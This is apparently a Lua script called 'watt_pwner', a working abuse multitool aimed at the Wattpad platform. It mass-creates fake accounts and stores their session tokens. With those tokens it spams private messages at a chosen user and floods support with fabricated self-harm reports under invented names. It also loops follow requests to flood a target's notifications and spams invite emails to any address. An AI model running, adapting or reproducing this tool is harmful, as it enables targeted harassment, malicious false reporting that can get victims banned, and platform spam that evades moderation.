--[[
    watt_pwner: a wattpad multitool by oj simpson and an anonymous collaborator
    version 0.4 beta
]]
print("\27[38;5;255m")
-- Requires
local json = require("json")
local http = require("coro-http")
-- Constants
local Version = "0.4-beta"
local maincolor = "\27[38;5;129m"
local default = "\27[38;5;255m"
-- Functions
function GetInput(txt)
    io.write(txt.." > ")
    local option
    repeat option = io.read() until type(option) == "string" and option:match("%S")
    return option
end
function wait(seconds)
    local start = os.time()
    repeat until os.time() > start + seconds
end
function starts(String,Start)
    return string.sub(String,1,string.len(Start))==Start
end
local charset = {}
for i = 48,  57 do table.insert(charset, string.char(i)) end
for i = 65,  90 do table.insert(charset, string.char(i)) end
for i = 97, 122 do table.insert(charset, string.char(i)) end

function randomstring(length)

  if length > 0 then
    return randomstring(length - 1) .. charset[math.random(1, #charset)]
  else
    return ""
  end
end
function writefile(file,content)
    open = io.open(file, "w")
    open:write(content)
    open:close()
end
function readfile(file)
    local open = io.open(file, "r")
    local thing = open:read("*all")
    open:close()
    return thing
end
function appendfile(file,content)
    local old_content = readfile(file)
    writefile(file,old_content..""..content) -- lmao
end
function string_random(a,b)
    return tostring(math.random(a,b))
end
function generate_ip()
   return string_random(0,255).."."..string_random(0,255).."."..string_random(0,255).."."..string_random(0,255).."."
end
function http_request(tbl)
    local result,grab = http.request(tbl.Method,tbl.Url,tbl.Headers,tbl.Body)
    local Cookies = {}
    for _,v in pairs(result) do
        if type(v) == "table" and v[1]:lower() == "set-cookie" then
            table.insert(Cookies,v[2])
        end
    end
    return {result = result,Cookies = Cookies, Body = grab}
end
function split(inputstr, sep)
    if sep == nil then
            sep = "%s"
    end
    local t={}
    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
            table.insert(t, str)
    end
    return t
end
function get_user_from_token(token)
    local home_url = "https://www.wattpad.com/settings/your-wattpad-data?json=1"
    local response = http_request(
        {
            Url = home_url,
            Method = "GET",
            Headers = {
                {"Content-Type","application/json; charset=UTF-8"},
                {"Cookie","wp_id=22700821-b1ca-4df7-b2ef-48a7ed608faf; fs__exp=4; lang=1; locale=en_US; ff=1; dpr=1; tz=-1; te_session_id=1652040028384; _ga_FNDTZ0MZDQ=GS1.1.1652119923.5.1.1652119960.0; _ga=GA1.1.40407520.1652040029; signupFrom=user_profile; OptanonConsent=isIABGlobal=false&datestamp=Mon+May+09+2022+19%3A12%3A39+GMT%2B0100+(British+Summer+Time)&version=6.10.0&hosts=&consentId=8d8b4b14-e875-4d96-a70a-0ae697964260&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1%2CC0003%3A1%2CSTACK…_t0eY1P9_7__-0zjhfdt-8N3f_X_L8X42M7vF36pq4KuR4Eu3LBIQdlHOHcTUmw6okVrzPsbk2cr7NKJ7PEmnMbO2dYGH9_n93TuZKY7_____7z_v-v_v____f_7-3f3__5_3---_e_V_99zbn9_____9nP___9v-_9________4IsgEmGpeQBdiWODJtGkUKIEYVhIdQKACigGFoisIHVwU7K4CfUELABAKgIwIgQYgowYBAAIBAEhEQEgB4IBEARAIAAQAKgEIACNgEFgBYGAQACgGhYgRQBCBIQZEBEcpgQESJRQT2ViCUHexphCHWWAFAo_oqEBEoAQLAyEhYOY4AkBLhZIFmKF8gBGCAAA.f_gAD_gAAAAA; nextUrl=%2Fhome; isStaff=1; hc=1; token="..token}

            }
        }
    )
    --[[
    local data = json.decode(response.Body)
    for i,v in pairs(data.sections) do
        if v.type == "greeting" then
            return v.data.greeting:sub(15,-2)
        end
    end
    ]]
    local data = json.decode(response.Body)
    return data.username
end
function is_valid_token(token)
    local response
    local s,e = pcall(function()
        response = http_request(
            {
                Url = "https://www.wattpad.com/settings",
                Method = "GET",
                Headers = {
                    {"Cookie","wp_id=22700821-b1ca-4df7-b2ef-48a7ed608faf; fs__exp=4; lang=1; locale=en_US; ff=1; dpr=1; tz=-1; te_session_id=1652040028384; _ga_FNDTZ0MZDQ=GS1.1.1652119923.5.1.1652119960.0; _ga=GA1.1.40407520.1652040029; signupFrom=user_profile; OptanonConsent=isIABGlobal=false&datestamp=Mon+May+09+2022+19%3A12%3A39+GMT%2B0100+(British+Summer+Time)&version=6.10.0&hosts=&consentId=8d8b4b14-e875-4d96-a70a-0ae697964260&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1%2CC0003%3A1%2CSTACK…_t0eY1P9_7__-0zjhfdt-8N3f_X_L8X42M7vF36pq4KuR4Eu3LBIQdlHOHcTUmw6okVrzPsbk2cr7NKJ7PEmnMbO2dYGH9_n93TuZKY7_____7z_v-v_v____f_7-3f3__5_3---_e_V_99zbn9_____9nP___9v-_9________4IsgEmGpeQBdiWODJtGkUKIEYVhIdQKACigGFoisIHVwU7K4CfUELABAKgIwIgQYgowYBAAIBAEhEQEgB4IBEARAIAAQAKgEIACNgEFgBYGAQACgGhYgRQBCBIQZEBEcpgQESJRQT2ViCUHexphCHWWAFAo_oqEBEoAQLAyEhYOY4AkBLhZIFmKF8gBGCAAA.f_gAD_gAAAAA; nextUrl=%2Fhome; isStaff=1; hc=1; token="..token}
                }
            }
        )
    end)
    if e then
        return false
    else
        if response.result.code == 200 and response.Body then
            if string.match(response.Body,"Change your account information and privacy settings") then
                return true
            else
                return false
            end
        else
            return false
        end
    end
end
local char_to_hex = function(c)
    return string.format("%%%02X", string.byte(c))
end

local function urlencode(url)
    if url == nil then
        return
    end
    url = url:gsub("\n", "\r\n")
    url = url:gsub("([^%w ])", char_to_hex)
    url = url:gsub(" ", "+")
    return url
end

local hex_to_char = function(x)
    return string.char(tonumber(x, 16))
end

local urldecode = function(url)
    if url == nil then
        return
    end
    url = url:gsub("+", " ")
    url = url:gsub("%%(%x%x)", hex_to_char)
    return url
end

local common_first_names = {
    "James",
    "John",
    "Robert",
    "Michael",
    "William",
    "David",
    "Richard",
    "Charles",
    "Joseph",
    "Thomas",
    "Christopher",
    "Daniel",
    "Paul",
    "Mark",
    "Donald"
}
local common_last_names = {
    "Smith",
    "Johnson",
    "Williams",
    "Brown",
    "Jones",
    "Garcia",
    "Miller",
    "Davis",
    "Rodriguez",
    "Martines",
    "Harnandez",
    "Lopez",
    "Gonzales",
    "Wilson",
    "Anderson"
}
function GenerateIdentity()
    local first_name = common_first_names[math.random(1,#common_first_names)]
    local last_name = common_last_names[math.random(1,#common_last_names)]
    local username = first_name..""..last_name..""..tostring(math.random(10,99))
    return {
        Name = first_name.." "..last_name,
        Email = username.."@gmail.com",
        FirstName = first_name,
        LastName = last_name,
        Username = username
    }
end

local options = {
    [1] = "Account Creator",
    [2] = "Conversation Spammer",
    [3] = "Verify Tokens",
    [4] = "Report Bot",
    [5] = "Follow Bot + Notification Exploit",
    [6] = "Userinvite Spammer"
}
function output_log(token,msg)
    print(maincolor.."["..string.sub(token,1,10).."...]"..default.." "..msg)
end

-- Actual code and shit
print(maincolor.."+-----------------------------+")
print([[
 __      __  _ __
 \ \ /\ / / | '_ \
  \ V  V /  | |_) |  watt_pwner
   \_/\_/   | .__/
      ______| |
     |______|_|
]])
print("+-----------------------------+"..default)
print("Version: "..Version)
print("Please select an option:")
print(maincolor.."+-----------------------------+"..default)
for i,v in pairs(options) do
    print("["..i.."] "..v)
end
print(maincolor.."+-----------------------------+"..default)
local option = GetInput("Please select your option")
if option == "1" then
    print("Account creator selected")
    local accs = GetInput("Accounts to create")
    local messageid = ""
    for i = 1,tonumber(accs) do
        local email = GetInput("Email")
        local id = GenerateIdentity()
        local request = {
            ["signup-from"] = "new_landing_undefined",
            ["form-type"] = "",
            ["username"] = id.Username,
            ["email"] = email,
            ["password"] = randomstring(10),
            month = "09",
            day = "09",
            year = "1996"

        }
        print("Username: "..id.Username)
        print("Creating account...")
        local response = http_request(
            {
                Url = "https://www.wattpad.com/signup?nextUrl=/home",
                Method = "POST",
                Headers = {
                    {"Content-Type","application/json; charset=UTF-8"},
                    --["Cookie"] = "wp_id=22700821-b1ca-4df7-b2ef-48a7ed608faf; fs__exp=4; lang=1; locale=en_US; ff=1; dpr=1; tz=-1; te_session_id=1652040028384; _ga_FNDTZ0MZDQ=GS1.1.1652119923.5.1.1652119960.0; _ga=GA1.1.40407520.1652040029; signupFrom=user_profile; OptanonConsent=isIABGlobal=false&datestamp=Mon+May+09+2022+19%3A12%3A39+GMT%2B0100+(British+Summer+Time)&version=6.10.0&hosts=&consentId=8d8b4b14-e875-4d96-a70a-0ae697964260&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1%2CC0003%3A1%2CSTACK…_t0eY1P9_7__-0zjhfdt-8N3f_X_L8X42M7vF36pq4KuR4Eu3LBIQdlHOHcTUmw6okVrzPsbk2cr7NKJ7PEmnMbO2dYGH9_n93TuZKY7_____7z_v-v_v____f_7-3f3__5_3---_e_V_99zbn9_____9nP___9v-_9________4IsgEmGpeQBdiWODJtGkUKIEYVhIdQKACigGFoisIHVwU7K4CfUELABAKgIwIgQYgowYBAAIBAEhEQEgB4IBEARAIAAQAKgEIACNgEFgBYGAQACgGhYgRQBCBIQZEBEcpgQESJRQT2ViCUHexphCHWWAFAo_oqEBEoAQLAyEhYOY4AkBLhZIFmKF8gBGCAAA.f_gAD_gAAAAA; nextUrl=%2Fhome; isStaff=1; hc=1; token="..thistoken
                },
                Body = json.encode(request)
            }
        )
        local token
        for i,v in pairs(response.Cookies) do
            if starts(v,"token=") then
                local values = split(v,";")
                token = values[1]:sub(7)
            end
        end
        if type(token) == "string" then
            print("\27[38;5;120mGot token! "..token.."\27[38;5;255m")
            appendfile("tokens.txt","\n"..token)
            print("Make sure to activate the account manually before using the token.")
        else
            print("\27[38;5;1mUnable to get token. \27[38;5;255m")
        end
    end
elseif option == "2" then
    print("Conversation spammer selected")
    local tokenfile = readfile("tokens.txt")
    local token = split(tokenfile,"\n")
    print("Loaded "..#token.." tokens.\n")
    local user = GetInput("Target")
    local msges = tonumber(GetInput("Amount of messages"))
    local delay = tonumber(GetInput("Delay between messages"))
    local switchingvpns = false
    for i = 1,msges,1 do
        local s,e = pcall(function()
                    if switchingvpns == false then
                local request = {
                    body = readfile("message.txt")..urldecode("%00"),
                    broadcast = false,
                    createDate = nil,
                    from = nil,
                    id = nil,
                    isReply = false,
                    ownername = user,
                    parent_id = nil,
                    parentId = nil,
                    broadcast = true
                }
                local thistoken = token[math.random(1,#token)]
                local response = http_request(
                    {
                        Url = "https://www.wattpad.com/v4/users/"..user.."/messages",
                        Method = "POST",
                        Headers = {
                            {"Content-Type","application/json; charset=UTF-8"},
                            {"Cookie","wp_id=22700821-b1ca-4df7-b2ef-48a7ed608faf; fs__exp=4; lang=1; locale=en_US; ff=1; dpr=1; tz=-1; te_session_id=1652040028384; _ga_FNDTZ0MZDQ=GS1.1.1652119923.5.1.1652119960.0; _ga=GA1.1.40407520.1652040029; signupFrom=user_profile; OptanonConsent=isIABGlobal=false&datestamp=Mon+May+09+2022+19%3A12%3A39+GMT%2B0100+(British+Summer+Time)&version=6.10.0&hosts=&consentId=8d8b4b14-e875-4d96-a70a-0ae697964260&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1%2CC0003%3A1%2CSTACK…_t0eY1P9_7__-0zjhfdt-8N3f_X_L8X42M7vF36pq4KuR4Eu3LBIQdlHOHcTUmw6okVrzPsbk2cr7NKJ7PEmnMbO2dYGH9_n93TuZKY7_____7z_v-v_v____f_7-3f3__5_3---_e_V_99zbn9_____9nP___9v-_9________4IsgEmGpeQBdiWODJtGkUKIEYVhIdQKACigGFoisIHVwU7K4CfUELABAKgIwIgQYgowYBAAIBAEhEQEgB4IBEARAIAAQAKgEIACNgEFgBYGAQACgGhYgRQBCBIQZEBEcpgQESJRQT2ViCUHexphCHWWAFAo_oqEBEoAQLAyEhYOY4AkBLhZIFmKF8gBGCAAA.f_gAD_gAAAAA; nextUrl=%2Fhome; isStaff=1; hc=1; token="..thistoken}
                        },
                        Body = json.encode(request)
                    }
                )
                if response and response.result.code == 200 then
                    output_log(thistoken,"Sent message")
                else
                    pcall(function() output_log(thistoken,"Error: "..json.decode(response.Body).message) end)
                end
            end
            wait(delay)
        end) if e then print("\27[38;5;1m["..i.."] Error: "..e) end
    end
elseif option == "3" then
    local tokenfile = readfile("tokens.txt")
    local token = split(tokenfile,"\n")
    local remove_invalid = (GetInput("Remove invalid tokens (y/n)"):lower() == "y")
    print("Loaded "..#token.." tokens.")
    print("Starting verification\n")
    for i,thistoken in pairs(token) do
        local valid = is_valid_token(thistoken)
        if valid then
            print("Valid token, Token: "..thistoken..""..default)
        else
            print("\27[38;5;1mInvalid token, Token: "..thistoken..""..default)
            if remove_invalid then
                table.remove(token,i)
            end
        end
        wait(0.1)
    end
    if remove_invalid then
        local new_token_file = ""
        for i,v in pairs(token) do
            new_token_file = new_token_file..""..v.."\n"
        end
        writefile("tokens.txt",new_token_file)
    end
elseif option == "4" then
    local tokenfile = readfile("tokens.txt")
    local token = split(tokenfile,"\n")
    print("Loaded "..#token.." tokens.")
    local usertoreport = GetInput("User To Report")
    local reportamount = tonumber(GetInput("How many reports"))
    local reasons = {
        [1] = {
            Name = "Selfharm",
            TrueName = "violence_or_self_harm_conduct"
        }
    }
    for i,v in pairs(reasons) do
        print("["..i.."] "..v.Name)
    end
    local reason
    function TryReason()
        str_rsn = GetInput("Reason")
        local s,e = pcall(function()
            reason = reasons[tonumber(str_rsn)].TrueName
        end) if e then print("Invalid Reason") TryReason() end
    end
    TryReason()
    local full_reason = GetInput("Full Detailed Reason (Write Why)")
    for i = 1,reportamount do
        local id = GenerateIdentity()
        local thistoken = token[math.random(1,#token)]
        local thisran = randomstring(10)
        local body = urlencode("name="..id.Name.."&email="..id.Email.."&comment="..full_reason.." Reported User's Profile: https://www.wattpad.com/user/"..usertoreport.." &ticket_form_id="..tostring(math.random(1000,9999)).."&username="..usertoreport.."&reportType=user&reason="..reason.."&custom_fields[1][id]="..tostring(math.random(0,99999999)).."&custom_fields[1][value]=web&custom_fields[2][id]="..tostring(math.random(0,99999999)).."&custom_fields[2][value]="..reason.."&custom_fields[3][id]="..tostring(math.random(0,99999999)).."&custom_fields[3][value]=user_account_conduct")
        local body = "name="..urlencode(id.Name).."&email="..urlencode(id.Email).."&comment="..urlencode(full_reason).."%0A%0AReported+User's+Profile%3A+https%3A%2F%2Fwww.wattpad.com%2Fuser%2F"..usertoreport.."%0A%0A&ticket_form_id="..tostring(math.random(1000,9999)).."&username="..usertoreport.."&reportType=user&reason="..full_reason.."&custom_fields%5B0%5D%5Bid%5D=22708584&custom_fields%5B0%5D%5Bvalue%5D=en_US&custom_fields%5B1%5D%5Bid%5D=21519886&custom_fields%5B1%5D%5Bvalue%5D=web&custom_fields%5B2%5D%5Bid%5D=22875340&custom_fields%5B2%5D%5Bvalue%5D="..full_reason.."&custom_fields%5B3%5D%5Bid%5D=360041074311&custom_fields%5B3%5D%5Bvalue%5D=user_account_conduct"
        local response = http_request(
            {
                Url = "https://www.wattpad.com/v4/support/tickets/",
                Method = "POST",
                Headers = {
                    {"content-type","application/x-www-form-urlencoded; charset=UTF-8"},
                    {"Cookie","wp_id=22700821-b1ca-4df7-b2ef-48a7ed608faf; fs__exp=4; lang=1; locale=en_US; ff=1; dpr=1; tz=-1; te_session_id=1652040028384; _ga_FNDTZ0MZDQ=GS1.1.1652119923.5.1.1652119960.0; _ga=GA1.1.40407520.1652040029; signupFrom=user_profile; OptanonConsent=isIABGlobal=false&datestamp=Mon+May+09+2022+19%3A12%3A39+GMT%2B0100+(British+Summer+Time)&version=6.10.0&hosts=&consentId=8d8b4b14-e875-4d96-a70a-0ae697964260&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1%2CC0003%3A1%2CSTACK…_t0eY1P9_7__-0zjhfdt-8N3f_X_L8X42M7vF36pq4KuR4Eu3LBIQdlHOHcTUmw6okVrzPsbk2cr7NKJ7PEmnMbO2dYGH9_n93TuZKY7_____7z_v-v_v____f_7-3f3__5_3---_e_V_99zbn9_____9nP___9v-_9________4IsgEmGpeQBdiWODJtGkUKIEYVhIdQKACigGFoisIHVwU7K4CfUELABAKgIwIgQYgowYBAAIBAEhEQEgB4IBEARAIAAQAKgEIACNgEFgBYGAQACgGhYgRQBCBIQZEBEcpgQESJRQT2ViCUHexphCHWWAFAo_oqEBEoAQLAyEhYOY4AkBLhZIFmKF8gBGCAAA.f_gAD_gAAAAA; nextUrl=%2Fhome; isStaff=1; hc=1; token="..thistoken}
                },
                Body = body
            }
        )
        if response.result.code == 200 then
            output_log(thistoken,"Sent Report! Name used: "..id.Name.."")
        else
            output_log(thistoken,"Error: "..response.Body.."")
        end
    end
elseif option == "5" then
    local tokenfile = readfile("tokens.txt")
    local token = split(tokenfile,"\n")
    print("Loaded "..#token.." tokens.")
    local user = GetInput("User to follow")
    local not_spam_exploit = ((GetInput("Follow notification exploit (y/n)"):lower()) == "y")


    function follow_user(i,v)
        if is_valid_token(v) then
            local response = http_request(
                {
                    Url = "https://www.wattpad.com/api/v3/users/"..get_user_from_token(v).."/following?users="..user,
                    Method = "POST",
                    Headers = {
                        {"content-type","application/x-www-form-urlencoded; charset=UTF-8"},
                        {"Cookie","wp_id=22700821-b1ca-4df7-b2ef-48a7ed608faf; fs__exp=4; lang=1; locale=en_US; ff=1; dpr=1; tz=-1; te_session_id=1652040028384; _ga_FNDTZ0MZDQ=GS1.1.1652119923.5.1.1652119960.0; _ga=GA1.1.40407520.1652040029; signupFrom=user_profile; OptanonConsent=isIABGlobal=false&datestamp=Mon+May+09+2022+19%3A12%3A39+GMT%2B0100+(British+Summer+Time)&version=6.10.0&hosts=&consentId=8d8b4b14-e875-4d96-a70a-0ae697964260&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1%2CC0003%3A1%2CSTACK…_t0eY1P9_7__-0zjhfdt-8N3f_X_L8X42M7vF36pq4KuR4Eu3LBIQdlHOHcTUmw6okVrzPsbk2cr7NKJ7PEmnMbO2dYGH9_n93TuZKY7_____7z_v-v_v____f_7-3f3__5_3---_e_V_99zbn9_____9nP___9v-_9________4IsgEmGpeQBdiWODJtGkUKIEYVhIdQKACigGFoisIHVwU7K4CfUELABAKgIwIgQYgowYBAAIBAEhEQEgB4IBEARAIAAQAKgEIACNgEFgBYGAQACgGhYgRQBCBIQZEBEcpgQESJRQT2ViCUHexphCHWWAFAo_oqEBEoAQLAyEhYOY4AkBLhZIFmKF8gBGCAAA.f_gAD_gAAAAA; nextUrl=%2Fhome; isStaff=1; hc=1; token="..v}
                    },
                    Body = "users="..user
                }
            )
            if response.result.code == 200 then
                output_log(v,"Followed user")
            else
                output_log(v,"Error: "..json.decode(response.Body).message)
            end
        else
            output_log(v,"Invalid token")
        end
    end
    if not_spam_exploit then
        while true do
            for i,v in pairs(token) do
                follow_user(i,v)
            end
        end
    else
        for i,v in pairs(token) do
            follow_user(i,v)
        end
    end
elseif option == "6" then
    local tokenfile = readfile("tokens.txt")
    local token = split(tokenfile,"\n")
    print("Loaded "..#token.." tokens.")
    local email = GetInput("Email to spam")
    local amount = GetInput("Amount of invites to send")
    for i = 1,tonumber(amount) do
        local v = token[math.random(1,#token)]
        local response = http_request(
            {
                Url = "https://www.wattpad.com/apiv2/userinvites",
                Method = "POST",
                Headers = {
                    {"content-type","application/x-www-form-urlencoded; charset=UTF-8"},
                    {"Cookie","wp_id=22700821-b1ca-4df7-b2ef-48a7ed608faf; fs__exp=4; lang=1; locale=en_US; ff=1; dpr=1; tz=-1; te_session_id=1652040028384; _ga_FNDTZ0MZDQ=GS1.1.1652119923.5.1.1652119960.0; _ga=GA1.1.40407520.1652040029; signupFrom=user_profile; OptanonConsent=isIABGlobal=false&datestamp=Mon+May+09+2022+19%3A12%3A39+GMT%2B0100+(British+Summer+Time)&version=6.10.0&hosts=&consentId=8d8b4b14-e875-4d96-a70a-0ae697964260&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1%2CC0003%3A1%2CSTACK…_t0eY1P9_7__-0zjhfdt-8N3f_X_L8X42M7vF36pq4KuR4Eu3LBIQdlHOHcTUmw6okVrzPsbk2cr7NKJ7PEmnMbO2dYGH9_n93TuZKY7_____7z_v-v_v____f_7-3f3__5_3---_e_V_99zbn9_____9nP___9v-_9________4IsgEmGpeQBdiWODJtGkUKIEYVhIdQKACigGFoisIHVwU7K4CfUELABAKgIwIgQYgowYBAAIBAEhEQEgB4IBEARAIAAQAKgEIACNgEFgBYGAQACgGhYgRQBCBIQZEBEcpgQESJRQT2ViCUHexphCHWWAFAo_oqEBEoAQLAyEhYOY4AkBLhZIFmKF8gBGCAAA.f_gAD_gAAAAA; nextUrl=%2Fhome; isStaff=1; hc=1; token="..v}
                },
                Body = "emails="..urlencode(email).."&id=&content=&req_type=new"
            }
        )
        if response.result.code == 200 then
            output_log(v,"Sent invite")
        else
            output_log(v,"Error: "..response.Body)
        end
    end
end
print("\27[38;5;255m")
